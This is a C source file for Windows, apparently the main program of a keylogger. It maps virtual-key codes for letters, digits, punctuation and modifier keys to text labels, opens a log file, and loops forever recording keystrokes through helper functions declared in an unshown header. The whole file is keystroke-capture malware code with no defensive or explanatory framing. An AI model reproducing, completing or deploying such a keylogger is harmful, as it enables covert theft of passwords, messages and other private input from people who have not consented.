#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Winuser.h>
#include <time.h>
#include "header.h"

int main() {
    int flag = 0;
    int inKeys[NUMKEYS] = {0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0xC0, 0xBD, 0xBB, 0xDB, 0xDD, 0xDC, 0xBA, 0xDE, 0xBC, 0xBE, 0xBF, 0x20, 0x0D, 0x10, 0x11, 0x12, 0x08, 0x09};
    char outKeys[NUMKEYS][KEYLETTERS] = {"a\0", "b\0", "c\0", "d\0", "e\0", "f\0", "g\0", "h\0", "i\0", "j\0", "k\0", "l\0", "m\0", "n\0", "o\0", "p\0", "q\0", "r\0", "s\0", "t\0", "u\0", "v\0", "w\0", "x\0", "y\0", "z\0", "0\0", "1\0", "2\0", "3\0", "4\0", "5\0", "6\0", "7\0", "8\0", "9\0", "`\0", "-\0", "=\0", "[\0", "]\0", "\\\0", ";\0", "'\0", ",\0", ".\0", "/\0", "space\0", "enter\0", "shift\0", "ctrl\0", "alt\0", "backspace\0", "tab\0"};
    /* a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 ` - = [ ] \ ; ' , . / space enter shift ctrl alt tab */
    char shiftedKeys[SHIFTKEYS][KEYLETTERS] = {"A\0", "B\0", "C\0", "D\0", "E\0", "F\0", "G\0", "H\0", "I\0", "J\0", "K\0", "L\0", "M\0", "N\0", "O\0", "P\0", "Q\0", "R\0", "S\0", "T\0", "U\0", "V\0", "W\0", "X\0", "Y\0", "Z\0", ")\0", "!\0", "@\0", "#\0", "$\0", "%\0", "^\0", "&\0", "*\0", "(\0", "~\0", "_\0", "+\0", "{\0", "}\0", "|\0", ":\0", "\"\0", "<\0", ">\0", "?\0"};
    /* A B C D E F G H I J K L M N O P Q R S T U V W X Y Z ) ! @ # $ % ^ & * ( ~ _ + { } | : " < > ? */
    FILE *fp;
    fp = openFile();
    while (1) {
        checkKeyboard(fp, flag, inKeys, outKeys, shiftedKeys);
        flag = 1;
    }
}